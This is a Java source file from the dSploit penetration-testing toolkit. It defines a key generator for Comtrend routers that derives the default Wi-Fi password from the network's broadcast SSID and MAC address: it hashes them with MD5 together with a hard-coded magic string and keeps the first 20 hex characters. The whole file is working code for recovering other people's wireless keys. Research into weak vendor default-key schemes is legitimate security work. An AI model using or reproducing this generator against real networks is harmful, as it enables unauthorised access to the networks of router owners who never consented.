/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package it.evilsocket.dsploit.wifi.algorithms;

import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.List;

import it.evilsocket.dsploit.wifi.Keygen;

public class ComtrendKeygen extends Keygen {

    final private String ssidIdentifier;
    private MessageDigest md;

    public ComtrendKeygen(String ssid, String mac, int level, String enc) {
        super(ssid, mac, level, enc);
        ssidIdentifier = ssid.substring(ssid.length() - 4);
    }

    static final String magic = "bcgbghgg";

    @Override
    public List<String> getKeys() {
        try {
            md = MessageDigest.getInstance("MD5");
        } catch (NoSuchAlgorithmException e1) {
            setErrorMessage("This phone cannot process a MD5 hash.");
            return null;
        }
        final String mac = getMacAddress();
        if (mac.length() != 12) {
            setErrorMessage("The MAC address is invalid.");
            return null;
        }
        try {
            final String macMod = mac.substring(0, 8) + ssidIdentifier;
            md.reset();
            md.update(magic.getBytes("ASCII"));
            md.update(macMod.toUpperCase().getBytes("ASCII"));
            md.update(mac.toUpperCase().getBytes("ASCII"));
            byte[] hash = md.digest();
            addPassword(getHexString(hash).substring(0, 20));
            return getResults();
        } catch (UnsupportedEncodingException e) {
        }
        return null;
    }
}
